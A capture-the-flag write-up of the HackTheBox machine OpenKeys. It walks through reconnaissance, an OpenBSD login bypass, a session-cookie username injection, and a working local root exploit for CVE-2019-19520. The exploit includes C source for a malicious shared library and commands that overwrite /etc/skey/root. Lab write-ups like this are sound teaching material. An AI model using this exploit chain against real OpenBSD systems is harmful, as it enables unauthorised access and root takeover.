---
image: /assets/avatar/assets/openkeys.png
title: OpenKeys Writeup
author: Valerio Casalino
style: fill
tags: [Writeups, Hackthebox]
description: Writeup for OpenKeys (Hackthebox)
---

# OpenKeys

As always... `nmap` that thing:

```bash
ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.199 | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -p $ports -sC -sV 10.10.10.199
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
...
```

On port 80, we find a login page and no more info:

![image-20201105213128889](/assets/openkeys/image-20201105213128889.png)

So, we can use `gobuster`, or whatever alternative, to find some not indexed folder:

```bash
gobuster dir -w /usr/share/wordlists/discovery/directory-list-2.3-medium.txt -u http://10.10.10.199
```

![image-20201105213056896](/assets/openkeys/image-20201105213056896.png)

And we found `/includes`, which contains 2 files `auth.php` and `auth.php.swp`, which is a `vim` swap file, and, most importantly, readable! Since it is a binary file which showing the last changes made on a file, we can read them all with:

```bash
>>> vim -r auth.php.swp
...
$cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
...
$_SESSION["username"] = $_REQUEST['username'];
...
>>> strings auth.php.swp | head -n 2
b0VIM 8.1
jennifer
```

So, downloading that file, we can investigate on that:

```bash
file check_auth
...
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
...
```

It is a shared object for OpenBSD, and that means that it could be vulnerable to [an authentication bypass](https://securityaffairs.co/wordpress/94755/security/openbsd-security-flaws.html), and fortunately it is! The only thing to do it's to authenticate with `-schallenge:password` through `burp`:

![image-20201105220647715](/assets/openkeys/image-20201105220647715.png)

This means that the authentication worked! But we don't get any ssh key because no user is specified... The user name found in the `.swp` file was `jennifer`, so we can add `;username=jennifer` to the `PHPSESSID` to make `auth.php` parse it.

```
Cookie: PHPSESSID=...;username=jennifer
```

Copy the ssh key and access with user! Now, let's investigate on how to get `root`. Let's check the OpenBSD version:

```bash
uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```

On the openBSD website, there is a [list of vulnerabilities](https://www.openbsd.org/errata66.html) for this version, and the [CVE-2019-19520](https://nvd.nist.gov/vuln/detail/CVE-2019-19520) worked as intended! We need to compile this file on the victim machine:

```c
// swrast_dri.c
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
```

This will change the `RUID`, `EUID` and `GUID` to 0, so `root`, when called. After we compile the file:

```bash
cc -fpic -shared -s -o swrast_dri.so swrast_dri.c && rm -rf swrast_dri.c
```

We need to set the `LIBGL_DRIVERS_PATH=.` to make `xlock` use our `swarst_dri.so`, instead of the real one. To do so, we just need to run these simple commands:

```bash
env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display 
# Your password is: EGG LARD GROW HOG DRAG LAIN
echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66 
env -i TERM=vt220 su -l -a skey
```

![image-20201106002129492](/assets/openkeys/image-20201106002129492.png)

..profit!
